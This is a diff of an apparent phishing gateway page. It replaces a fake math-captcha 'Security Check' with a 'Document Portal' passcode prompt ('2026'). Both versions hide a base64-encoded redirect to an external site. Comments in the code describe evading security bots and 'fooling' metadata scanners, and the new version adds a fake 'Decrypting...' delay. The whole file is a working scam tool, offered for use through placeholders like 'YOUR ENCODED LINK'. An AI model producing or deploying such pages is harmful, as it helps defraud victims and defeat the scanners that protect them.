@@ -3,80 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- These tags prevent security bots from indexing your page -->
-    <meta name="robots" content="noindex, nofollow, noarchive">
-    <meta name="referrer" content="no-referrer">
-    <title>Checking...</title>
+    <meta name="robots" content="noindex, nofollow">
+    <title>Document Portal | Security</title>
     <style>
-        :root { --p: #2563eb; --t: #1e293b; }
-        body { margin:0; background:#f8fafc; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; }
-        .card { background:#fff; padding:2.5rem; border-radius:16px; box-shadow:0 20px 25px -5px rgba(0,0,0,0.1); width:100%; max-width:350px; text-align:center; border:1px solid #e2e8f0; }
-        .icon { background:#eff6ff; width:60px; height:60px; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 1.5rem; font-size: 24px; }
-        h1 { font-size:1.3rem; color:var(--t); margin-bottom:0.5rem; }
-        p { color:#64748b; font-size:0.9rem; line-height:1.5; margin-bottom:1.5rem; }
-        .captcha { background:#f1f5f9; border:1px solid #cbd5e1; padding:1.2rem; border-radius:12px; margin-bottom:1rem; }
-        #q-text { font-weight:700; font-size:1.1rem; display:block; margin-bottom:0.8rem; }
-        input { width:80px; padding:10px; border:2px solid #cbd5e1; border-radius:8px; text-align:center; font-size:1.1rem; outline:none; }
-        input:focus { border-color:var(--p); }
-        button { width:100%; background:var(--p); color:#fff; border:none; padding:14px; border-radius:8px; font-weight:600; cursor:pointer; transition:0.2s; }
-        button:hover { background:#1d4ed8; }
-        #err { color:#ef4444; font-size:0.8rem; margin-top:10px; display:none; }
-        .hp { position:absolute; left:-9999px; top:-9999px; } /* Honeypot */
+        body { margin:0; background:#f4f7fa; font-family:'Segoe UI',Arial,sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; color:#1a2b4b; }
+        .card { background:#fff; padding:40px; border-radius:12px; box-shadow:0 15px 35px rgba(0,0,0,0.1); width:100%; max-width:400px; text-align:center; border-top: 6px solid #1a2b4b; }
+        .logo { margin-bottom:20px; color:#1a2b4b; }
+        h2 { font-size:1.4rem; margin-bottom:10px; color:#1a2b4b; }
+        p { color:#677788; font-size:0.95rem; line-height:1.5; margin-bottom:30px; }
+        .input-group { background:#f8fafc; border:1px solid #e2e8f0; padding:25px; border-radius:10px; margin-bottom:20px; }
+        label { display:block; font-weight:600; font-size:0.85rem; text-transform:uppercase; letter-spacing:1px; margin-bottom:12px; color:#4a5568; }
+        input { width:120px; padding:12px; border:2px solid #cbd5e1; border-radius:6px; font-size:1.3rem; text-align:center; letter-spacing:4px; outline:none; transition:0.2s; }
+        input:focus { border-color:#1a2b4b; background:#fff; }
+        button { width:100%; background:#1a2b4b; color:#fff; border:none; padding:15px; border-radius:6px; font-size:1rem; font-weight:600; cursor:pointer; transition:0.3s; }
+        button:hover { background:#2d3748; box-shadow:0 4px 12px rgba(0,0,0,0.15); }
+        #err { color:#e53e3e; font-size:0.85rem; margin-top:15px; display:none; font-weight:500; }
+        .footer-note { margin-top:25px; font-size:0.75rem; color:#a0aec0; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="icon">🛡️</div>
-    <h1 id="title">Security Check</h1>
-    <p id="desc">Complete the verification to continue to the destination.</p>
+    <div class="logo">
+        <svg width="50" height="50" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+    </div>
+    <h2>Access Submission</h2>
+    <p>This document is protected. Please enter the passcode provided in your notification.</p>
 
-    <div class="hp"><input type="text" id="bot_check" tabindex="-1"></div>
-
-    <div class="captcha">
-        <span id="q-text"></span>
-        <input type="number" id="ans_input" placeholder="?">
-        <div id="err">Incorrect. Please try again.</div>
+    <div class="input-group">
+        <label for="pass">Enter Passcode</label>
+        <input type="password" id="pass" maxlength="4" placeholder="••••">
+        <div id="err">Invalid passcode. Please check your email.</div>
     </div>
 
-    <button onclick="verify()">Verify & Continue</button>
+    <button onclick="unlock()">Verify & View Document</button>
+
+    <div class="footer-note">
+        Protected by SecureReview™ Verification System
+    </div>
 </div>
 
 <script>
-    // YOUR ENCODED LINK
-    const _secret = "aHR0cHM6Ly9qYWxlbW9kYWV2aS5jb20vMDMyNjczODYycjc0MzZyMjAzNDhyNjI0MzA3OHI2MjczNDYwODI2MzY1Mjg3NDYzNTc2MjA0MzY1MjYwMzQ4NTI2NDM1MDI2MzQ3ODAyMzQ1MjQzNTI1MzUyNC8yODM3NDUzMzIzamtqZHNidmZremZhZGZzdi5odG1s";
+    // YOUR ENCODED REDIRECT LINK
+    const _target = "aHR0cHM6Ly9qYWxlbW9kYWV2aS5jb20vMDMyNjczODYycjc0MzZyMjAzNDhyNjI0MzA3OHI2MjczNDYwODI2MzY1Mjg3NDYzNTc2MjA0MzY1MjYwMzQ4NTI2NDM1MDI2MzQ3ODAyMzQ1MjQzNTI1MzUyNC8yODM3NDUzMzIzamtqZHNidmZremZhZGZzdi5odG1s";
 
-    // Random Math
-    const v1 = Math.floor(Math.random() * 8) + 2;
-    const v2 = Math.floor(Math.random() * 5) + 1;
-    const result = v1 + v2;
+    function unlock() {
+        const pin = document.getElementById('pass').value;
+        const err = document.getElementById('err');
 
-    // Set UI
-    document.getElementById('q-text').innerText = v1 + " + " + v2 + " = ?";
-    
-    // Change Title after 1 second (Fools simple metadata scanners)
-    setTimeout(() => { document.title = "Human Verification"; }, 1000);
-
-    function verify() {
-        const userAns = document.getElementById('ans_input').value;
-        const botTrap = document.getElementById('bot_check').value;
-        const errMsg = document.getElementById('err');
-
-        // Bot behavior check
-        if (botTrap !== "") return; 
-
-        if (parseInt(userAns) === result) {
-            // Success - Decode and Redirect
-            window.location.href = atob(_secret);
+        // MATCHING THE PASSCODE FROM YOUR IMAGE (2026)
+        if (pin === "2026") {
+            err.style.display = 'none';
+            // Simple delay to look like it's "processing"
+            document.querySelector('button').innerText = "Decrypting...";
+            setTimeout(() => {
+                window.location.href = atob(_target);
+            }, 1000);
         } else {
-            errMsg.style.display = 'block';
-            document.getElementById('ans_input').value = "";
+            err.style.display = 'block';
+            document.getElementById('pass').value = "";
         }
     }
 
-    // Enter key support
-    document.getElementById('ans_input').addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') verify();
+    // Allow Enter key
+    document.getElementById('pass').addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') unlock();
     });
 </script>
 
